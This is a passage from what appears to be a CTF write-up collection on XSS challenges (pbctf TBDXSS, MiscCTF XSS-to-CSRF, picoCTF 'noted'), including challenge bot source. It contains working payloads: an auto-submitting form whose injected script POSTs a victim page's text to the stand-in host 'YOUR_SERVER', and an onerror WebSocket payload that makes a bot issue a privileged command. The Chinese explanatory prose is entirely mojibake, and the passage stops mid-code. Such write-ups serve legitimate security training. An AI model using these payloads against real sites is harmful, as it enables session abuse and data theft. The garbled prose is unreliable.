&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://tbdxss.chal.perfect.blue/change_note&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;peko&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;const report = t =&amp;gt; fetch(&amp;#34;https://YOUR_SERVER/xss.php&amp;#34;, {method: &amp;#34;POST&amp;#34;, body: t}); report(window.opener.opener.document.body.textContent)&amp;lt;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>opennote.phpï¼šdelayååœ¨æ–°tabçš„/noteä¸­æ‰§è¡Œxss payloadï¼Œç”±äºæ˜¯æ–°tabï¼Œæ‰€ä»¥éœ€è¦&lt;code>window.opener.opener&lt;/code>æ‰å¯ä»¥åˆ°åŸå…ˆçš„main.php&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;_blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">},&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">)&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS">wp1&lt;/a> | &lt;a href="https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss">wp2&lt;/a> | &lt;a href="https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html">wp3&lt;/a>&lt;/p>
&lt;h2 id="miscctf-2021xss-to-csrf">[MiscCTF 2021]XSS to CSRF&lt;/h2>
&lt;p>&lt;a href="https://hg8.sh/posts/misc-ctf/xss-to-csrf/">https://hg8.sh/posts/misc-ctf/xss-to-csrf/&lt;/a>&lt;/p>
&lt;p>èŠå¤©æœºå™¨äººï¼Œå‘é€çš„è¯­å¥å¯ä»¥åŒ…å«Html ä¼šè¢«æ¸²æŸ“ï¼Œå°è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;img src=x onerror=alert(1)&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æœ‰åå°„å‹xsss&lt;/p>
&lt;p>è¿›ä¸€æ­¥äº†è§£è¿™ä¸ªBotçš„å·¥ä½œï¼Œé‡åˆ°&amp;quot;badwords&amp;quot;ä¼šæš‚åœå¯¹è¯ï¼Œè¯´æ˜åœ¨åç«¯ç»è¿‡äº†æŸäº›æ£€æµ‹&lt;/p>
&lt;p>ä½¿ç”¨websocketè¿›è¡Œå†…å®¹çš„äº¤äº’&lt;/p>
&lt;p>&lt;img src="https://user-images.githubusercontent.com/9076747/124016442-f240c000-d9e5-11eb-8acf-637f5c720f9c.png" alt="misc ctf chatbot websocket">&lt;/p>
&lt;p>å°è¯•ç›´æ¥å»ºç«‹ä¸æœåŠ¡ç«¯çš„è¿æ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>websocket = new WebSocket(&amp;#39;ws://misc.ctf:33433/&amp;#39;);
websocket.onmessage = function(message) { console.log(message.data); }
websocket.send(&amp;#39;test&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://user-images.githubusercontent.com/9076747/124016602-20be9b00-d9e6-11eb-91ea-f3653f1fe207.png" alt="misc ctf websocket chatbot connexion">&lt;/p>
&lt;p>ç»§ç»­å°è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt; websocket.send(&amp;#39;/help&amp;#39;)
{ &amp;#34;content&amp;#34;: &amp;#34;&amp;lt;message&amp;gt;&amp;#34; } to send a message
/moderator to enter moderator mode debugger
&amp;gt; websocket.send(&amp;#39;/moderator&amp;#39;)
You need to be authenticated to execute this command
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬æ²¡æœ‰ç›´æ¥è®¿é—®/moderatorçš„æƒåˆ©ï¼Œå€ŸåŠ©æ£€æµ‹&amp;quot;badwords&amp;quot;çš„åŠŸèƒ½ï¼Œå‘é€å«æœ‰å»ºç«‹websocketè¿æ¥çš„payloadï¼Œç”¨CSRFçš„æ–¹å¼è®©botè®¿é—® æŠŠç»“æœå¤–å¸¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws=new WebSocket(&amp;#39;ws://&amp;#39;+window.location.host);ws.onopen=()=&amp;gt;ws.send(&amp;#39;/moderator&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŠ ä¸Šä¸€ä¸ª&amp;quot;badwords&amp;quot;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>ğŸ–• &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws=new WebSocket(&amp;#39;ws://&amp;#39;+window.location.host);ws.onopen=()=&amp;gt;ws.send(&amp;#39;/moderator&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="247ctf-2021helicopter-administrator">*[247CTF 2021]Helicopter Administrator&lt;/h2>
&lt;p>&lt;a href="https://gusralph.info/exploiting-xss-for-sqli/">https://gusralph.info/exploiting-xss-for-sqli/&lt;/a>&lt;/p>
&lt;h2 id="picoctf-2022noted">[picoCTF 2022]noted&lt;/h2>
&lt;blockquote>
&lt;p>HINT:&lt;/p>
&lt;ol>
&lt;li>&amp;ldquo;Are you sure I followed all the best practices?&amp;rdquo;&lt;/li>
&lt;li>&amp;ldquo;There&amp;rsquo;s more than just HTTP(S)!&amp;rdquo;&lt;/li>
&lt;li>&amp;ldquo;Things that require user interaction normally in Chrome might not require it in Headless Chrome.&amp;rdquo;&lt;/li>
&lt;li>The description also stated that the headless chrome has no internet access. So it cannot be used to phone home outside the context of this application.&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>ç™»å…¥è´¦å·åæ‰èƒ½å‘å†…å®¹ï¼Œxss botä¼šå…ˆæ³¨å†Œéšæœºè´¦å· ç™»å…¥åå‘flag ç„¶åæµè§ˆæˆ‘ä»¬çš„urlï¼Œé¢˜ç›®æç¤ºxss botä¸èƒ½å‡ºç½‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// report.js
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;crypto&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;puppeteer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å¯¹urlæ— waf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">launch&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">headless&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">pipe&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;--incognito&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;--no-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;--disable-setuid-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">slowMo&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">pages&lt;/span>&lt;span style="color:#111">())[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://0.0.0.0:8080/register&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ³¨å†Œéšæœºè´¦å·
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;username&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hex&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;password&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hex&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[type=&amp;#34;submit&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">waituntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;domcontentloaded&amp;#39;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://0.0.0.0:8080/new&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;title&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;content&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FLAG&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;ctf{flag}&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[type=&amp;#34;submit&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">waituntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;domcontentloaded&amp;#39;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;about:blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7500&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// web.js
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">fastify&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/report&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">schema&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">reportSchema&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">preHandler&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">fastify&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">csrfProtection&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#75af00">auth&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Only one browser can be open at a time!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
